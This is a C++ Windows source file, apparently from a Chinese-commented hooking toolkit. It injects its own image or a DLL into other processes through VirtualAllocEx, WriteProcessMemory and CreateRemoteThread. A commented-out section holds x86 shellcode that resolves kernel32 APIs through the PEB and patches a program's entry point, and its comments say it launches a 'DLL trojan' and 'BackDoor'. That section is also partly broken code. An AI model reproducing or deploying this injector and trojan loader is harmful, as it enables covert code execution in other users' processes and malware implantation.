#include <windows.h>
#include <tlhelp32.h> 
#include <tchar.h>

#include "HookControlTool.h"

#pragma comment(lib,DIRECTORY_LIB "Function\\Function.Internal.CommonControl.lib")

CHookControlTool::CHookControlTool()
{
	EnableDebugPriv();
	if (m_hNtdll	 == NULL) { 
		m_hNtdll = GetModuleHandleA("ntdll.dll"); 
	}
	if (m_LdrLoadDll == NULL) {
		m_LdrLoadDll = (fLdrLoadDll)GetProcAddress (m_hNtdll,"LdrLoadDll");
	}  
	if (m_RtlInitUnicodeString == NULL){ 
		m_RtlInitUnicodeString = (fRtlInitUnicodeString)GetProcAddress(m_hNtdll,"RtlInitUnicodeString"); 
	}
}

CHookControlTool::~CHookControlTool()
{

}

HMODULE CHookControlTool::LoadDll( LPCSTR lpFileName)
{
	int StrLen = lstrlenA(lpFileName);  
	BSTR WideStr = SysAllocStringLen(NULL, StrLen);  
	MultiByteToWideChar(CP_ACP, 0, lpFileName, StrLen, WideStr, StrLen);  

	UNICODE_STRING usDllName;  
	m_RtlInitUnicodeString(&usDllName, WideStr);  
	SysFreeString(WideStr);  

	HANDLE DllHandle;  
	m_LdrLoadDll(0, 0, &usDllName, &DllHandle);  

	return (HMODULE)DllHandle;  
}  



LPVOID CHookControlTool::CopyModule(HANDLE proc, LPVOID image)
{
	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
	PIMAGE_DATA_DIRECTORY datadir;
	DWORD size = headers->OptionalHeader.SizeOfImage;
	LPVOID mem = NULL;
	LPBYTE buf = NULL;
	BOOL ok = FALSE;

	if (headers->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	if (IsBadReadPtr(image, size))
		return NULL;

	mem = VirtualAllocEx(proc, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (mem != NULL) {
		buf = (LPBYTE)VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		if (buf != NULL) {
			RtlCopyMemory(buf, image, size);

			datadir = &headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			if (datadir->Size > 0 && datadir->VirtualAddress > 0) {
				DWORD_PTR delta = (DWORD_PTR)((LPBYTE)mem - headers->OptionalHeader.ImageBase);
				DWORD_PTR olddelta = (DWORD_PTR)((LPBYTE)image - headers->OptionalHeader.ImageBase);
				PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(buf + datadir->VirtualAddress);

				while(reloc->VirtualAddress != 0) {
					if (reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
						DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
						LPWORD list = (LPWORD)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
						DWORD i;

						for (i = 0; i < count; i++) {
							if (list[i] > 0) {
								DWORD_PTR *p = (DWORD_PTR *)(buf + (reloc->VirtualAddress + (0x0FFF & (list[i]))));

								*p -= olddelta;
								*p += delta;
							}
						}
					}

					reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
				}

				ok = WriteProcessMemory(proc, mem, buf, size, NULL);
			}

			VirtualFree(buf, 0, MEM_RELEASE); // release buf
		}

		if (!ok) {
			VirtualFreeEx(proc, mem, 0, MEM_RELEASE);
			mem = NULL;
		}
	}

	return mem;
}

BOOL CHookControlTool::NewInject(DWORD dwPid, LPTHREAD_START_ROUTINE start,HINSTANCE hModule)
{
	HANDLE hProcess, thread;
	HMODULE module, newmodule;
	BOOL ok = FALSE;

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,FALSE, dwPid);

	if (hProcess != NULL) {
		module = (NULL == hModule) ? GetModuleHandle(NULL) : hModule;

		newmodule = (HMODULE)CopyModule(hProcess, module);

		if (newmodule != NULL) {
			LPTHREAD_START_ROUTINE entry = (LPTHREAD_START_ROUTINE)((LPBYTE)newmodule + (DWORD_PTR)((LPBYTE)start - (LPBYTE)module));

			thread = CreateRemoteThread(hProcess, NULL, 0, entry, NULL, 0, NULL);

			if (thread != NULL) {
				CloseHandle(thread);
				ok = TRUE;
			}
			else {
				VirtualFreeEx(hProcess, module, 0, MEM_RELEASE);
			}
		}

		CloseHandle(hProcess);
	}else
	{
		
		Out(Dbg,_T("Error:%sOpenProcess(%d) Failed."),Show(),dwPid);
	}

	return ok;
}

//////////////////////////////////////////////////////////////////////////
//
//	Explain: 插入代码,远程线程为RmoteThread()     
//	Parameter: Pid = 进程PID     
//	Return: 成功True,否则False     
//
//////////////////////////////////////////////////////////////////////////
BOOL CHookControlTool::InjectDll(LPCTSTR DllFullPath,DWORD dwProcessId)
{
	BOOL bRet = FALSE;
	HANDLE hRemoteProcess;
	EnableDebugPriv(SE_DEBUG_NAME);
	//打开远程线程
	hRemoteProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hRemoteProcess == NULL)
	{
		bRet = FALSE;
		return bRet;
	}

	PTCHAR pszLibFileRemote = NULL;

	//使用VirtualAllocEx函数在远程进程的内存地址空间分配DLL文件名空间
	pszLibFileRemote = (PTCHAR) VirtualAllocEx( hRemoteProcess, NULL, lstrlen(DllFullPath)+1, MEM_COMMIT, PAGE_READWRITE);
	if (pszLibFileRemote == NULL)
	{
		bRet = FALSE;
		return bRet;
	}

	//使用WriteProcessMemory函数将DLL的路径名写入到远程进程的内存空间
	bRet = WriteProcessMemory(hRemoteProcess, pszLibFileRemote, (void *) DllFullPath, lstrlen(DllFullPath)+1, NULL);

	//启动远程线程LoadLibraryA，通过远程线程调用创建新的线程
	DWORD dwID;
	LPVOID pFunc = LoadLibraryA;
	HANDLE hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, pszLibFileRemote, 0, &dwID );

	//如果执行失败，使用方法2
	if(!hRemoteThread)
	{
		Debug(Dbg,_T("HANDLE hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, pszLibFileRemote, 0, &dwID );"));
		//计算LoadLibraryA的入口地址
		PTHREAD_START_ROUTINE pfnStartAddr = NULL;
		pfnStartAddr= (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T("Kernel32")), "LoadLibraryA");
		if (pfnStartAddr == NULL)
		{
			bRet = FALSE;
			return bRet;
		}
		//(关于GetModuleHandle函数和GetProcAddress函数)

		//启动远程线程LoadLibraryA，通过远程线程调用创建新的线程
		HANDLE hRemoteThread;
		hRemoteThread = CreateRemoteThread( hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL);
			if (hRemoteThread == NULL)
			{
				bRet = FALSE;
				return bRet;
			}
	}

	// 释放句柄

	SafeCloseHandle(hRemoteProcess);
	SafeCloseHandle(hRemoteThread);

	return bRet;
}

/*
ULONG PushString(PVOID pData,LPCSTR lpString)
{
	ULONG uWriteDataLen = 0;
	DWORD dwFileNameLen = strlen(lpString);
	DWORD dwForMax = dwFileNameLen/4;
	DWORD dwRemainder = dwFileNameLen % 4;

	if (0 == dwRemainder)
	{
		dwRemainder = 4;
	}
	else
	{
		dwForMax ++;
		dwFileNameLen += 4 - dwRemainder;
	}

	CHAR szWriteData[5] = {104,0,0,0,0}; // 104 0x68 push 压入32位寄存器机器码

	for (int i = 0; i < dwForMax; i++)
	{

		if (0 == i)
			strncpy(&szWriteData[1],&lpString[dwFileNameLen-(i * 4 + 4)],dwRemainder);
		else
			strncpy(&szWriteData[1],&lpString[dwFileNameLen-(i * 4 + 4)],4);

		memcpy(pData+uWriteDataLen,szWriteData,5);
		uWriteDataLen += 5;
	}
	return uWriteDataLen;
}

BOOL InjectDll2(LPCSTR pszDllFullPath,DWORD dwProcessId,LPCSTR pszFunctionName = NULL)
{
	BOOL bRet = FALSE;
	HANDLE hRemoteProcess;
	EnableDebugPriv(SE_DEBUG_NAME);
	//打开远程线程
	hRemoteProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hRemoteProcess == NULL)
	{
		bRet = FALSE;
		return bRet;
	}

	PTCHAR pszLibFileRemote = NULL;

	//使用VirtualAllocEx函数在远程进程的内存地址空间分配DLL文件名空间
	pszLibFileRemote = (PTCHAR) VirtualAllocEx( hRemoteProcess, NULL, lstrlen(DllFullPath)+1, MEM_COMMIT, PAGE_READWRITE);
	if (pszLibFileRemote == NULL)
	{
		bRet = FALSE;
		return bRet;
	}

	//使用WriteProcessMemory函数将DLL的路径名写入到远程进程的内存空间
	bRet = WriteProcessMemory(hRemoteProcess, pszLibFileRemote, (void *) DllFullPath, lstrlen(DllFullPath)+1, NULL);

	//启动远程线程LoadLibraryA，通过远程线程调用创建新的线程
	DWORD dwID;
	LPVOID pFunc = LoadLibraryA;
	HANDLE hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, pszLibFileRemote, 0, &dwID );

	//如果执行失败，使用方法2
	if(!hRemoteThread)
	{
		Debug(Dbg,_T("HANDLE hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, pszLibFileRemote, 0, &dwID );"));
		//计算LoadLibraryA的入口地址
		PTHREAD_START_ROUTINE pfnStartAddr = NULL;
		pfnStartAddr= (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T("Kernel32")), "LoadLibraryA");
		if (pfnStartAddr == NULL)
		{
			bRet = FALSE;
			return bRet;
		}
		//(关于GetModuleHandle函数和GetProcAddress函数)

		//启动远程线程LoadLibraryA，通过远程线程调用创建新的线程
		HANDLE hRemoteThread;
		hRemoteThread = CreateRemoteThread( hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL);
		if (hRemoteThread == NULL)
		{
			bRet = FALSE;
			return bRet;
		}
	}

	// 释放句柄

	SafeCloseHandle(hRemoteProcess);
	SafeCloseHandle(hRemoteThread);

	return bRet;

	PVOID pExtra_data = NULL;

extra_data_start:
	_asm    mov eax,fs:[30h]			//得到PEB结构地址
	_asm    mov eax,[eax + 0ch]			//得到PEB_LDR_DATA结构地址 
	_asm    mov esi,[eax + 1ch]
next_module:
	_asm    mov   eax,[esi+08h]			//取列表中模块基址到eax
	_asm    mov   edi,[esi+20h]			//取所属模块的字串首地址到EDI
	_asm    mov   esi,[esi]
	_asm    cmp  [edi+12*2],0x0000		//cx=0 比较字串的尾部是否为0
	_asm    jnz  next_module			//继续枚举

	_asm    mov  edi,eax				//edi保存着kernel32的基址

	//通过搜索 kernel32.dll的导出表查找GetProcAddress函数的地址
	_asm    mov ebp, eax
	_asm    mov eax, [ebp + 3ch]
	_asm    mov edx, [ebp + eax + 78h]
	_asm    add edx, ebp
	_asm    mov ecx, [edx + 18h]
	_asm    mov ebx, [edx + 20h]
	_asm    add ebx, ebp

search:
	_asm    dec ecx
	_asm    mov esi, [ebx + ecx * 4]

	_asm    add esi, ebp
	_asm    mov eax, 0x50746547
	_asm    cmp [esi], eax				//比较"PteG"
	_asm    jne search
	_asm    mov eax, 0x41636f72
	_asm    cmp [esi + 4], eax
	_asm    jne search
	_asm    mov ebx, [edx + 24h]
	_asm    add ebx, ebp
	_asm    mov cx, [ebx + ecx * 2]
	_asm    mov ebx, [edx + 1ch]
	_asm    add ebx, ebp
	_asm    mov eax, [ebx + ecx * 4]
	_asm    add eax, ebp				//eax保存的就是GetProcAddress的地址

	//为局部变量分配空间
	_asm    push ebp
	_asm    sub esp, 50h
	_asm    mov ebp, esp

	//查找LoadLibrary的地址
	_asm    mov [ebp + 40h], eax		//把GetProcAddress的地址保存到ebp + 40中

	//开始查找LoadLibrary的地址, 先构造"LoadLibrary\0"
	_asm    push 0x0					//即'\0'
	_asm    push DWORD PTR 0x41797261
	_asm    push DWORD PTR 0x7262694c
	_asm    push DWORD PTR 0x64616f4c
	_asm    push esp					//压入"LoadLibrary\0"的地址
	_asm    push edi					//edi:kernel32的基址
	_asm    call [ebp + 40h]			//返回值(即LoadLibrary的地址)保存在eax中
	_asm    mov [ebp + 44h], eax		//保存LoadLibrary的地址到ebp + 44h
	_asm    push 0x00
	_asm    push esp                    //字符串"BackDoor"的地址
	_asm    call [ebp + 44h]			//或者call eax


	_asm    mov [ebp + 44h], eax		//保存LoadLibrary返回的句柄到ebp + 44h

	//开始查找FunctionName的地址, 先构造"FunctionNameName\0"
	_asm    push 0x0					//即'\0'
	_asm    push esp					//压入"FunctionNameName\0"的地址
	_asm    push [ebp + 44h]			//LoadLibrary返回的句柄
	_asm    call [ebp + 40h]			//调用GetProcAddress
	_asm    mov [ebp + 44h], eax		//保存FunctionNameName的地址到ebp + 44h

	_asm    call [ebp + 44h]			//保存FunctionNameName

	_asm    mov esp, ebp
	_asm    add esp, 0x50
	_asm    popad
extra_data_end:

GetExtraData:
		_asm pushad;
		_asm lea eax, extra_data_start;
		_asm mov pExtra_data, eax;
		_asm lea edx, extra_data_end;
		_asm sub edx, eax;
		_asm mov extra_data_real_length, edx;
		_asm popad;

		//写入附加数据(用于启动DLL木马)
		//修正Dll名称
		//LPCSTR lpDllName =(LPCSTR) pExtra_data + 118;
		//memset(pExtra_data + 118,0,20);
		//PVOID pData = malloc(0x1000);
		//memcpy(pData,pExtra_data, 0x76);
#define PUSH_STRING_DLLNAME_OFFSET			0x7F
#define PUSH_STRING_FUNCTIONNAME_OFFSET			PUSH_STRING_DLLNAME_OFFSET + 9
		BYTE * btExtraData = new BYTE[2048];
		ULONG extra_data_real_length = 0;
		memcpy(btExtraData,pExtra_data,PUSH_STRING_DLLNAME_OFFSET);
		extra_data_real_length = PUSH_STRING_DLLNAME_OFFSET;




		DWORD dwFileNameLen = strlen(pszDllFullPath);
		DWORD dwForMax = dwFileNameLen/4;
		DWORD dwRemainder = dwFileNameLen % 4;

		if (0 == dwRemainder)
		{
			dwRemainder = 4;
		}
		else
		{
			dwForMax ++;
			dwFileNameLen += 4 - dwRemainder;
		}

		CHAR szWriteData[5] = {104,0,0,0,0}; // 104 0x68 push 压入32位寄存器机器码

		for (int i = 0; i < dwForMax; i++)
		{

			if (0 == i)
				strncpy(&szWriteData[1],&pszDllFullPath[dwFileNameLen-(i * 4 + 4)],dwRemainder);
			else
				strncpy(&szWriteData[1],&pszDllFullPath[dwFileNameLen-(i * 4 + 4)],4);

			memcpy(btExtraData+extra_data_real_length,szWriteData,5);
			extra_data_real_length += 5;
		}
		memcpy(btExtraData+extra_data_real_length,(PVOID)((ULONG)pExtra_data + PUSH_STRING_DLLNAME_OFFSET),9);
		extra_data_real_length += 9;

		extra_data_real_length += PushString(btExtraData+extra_data_real_length,pszFunctionName);

		memcpy(btExtraData+extra_data_real_length,(PVOID)((ULONG)pExtra_data + PUSH_STRING_FUNCTIONNAME_OFFSET),19);
		extra_data_real_length += 19;

				/*

		oldEP -= newEP + extra_data_real_length + 5;
		Out(Outputs,_T("Corrected Ord Entry Address = 0x%08X"), oldEP);

		BYTE jmp = 0xE9;
		fwrite(&jmp, sizeof(jmp), 1, pNewFile);
		fwrite(&oldEP, sizeof(oldEP), 1, pNewFile);
		bReturn = TRUE;
}
*/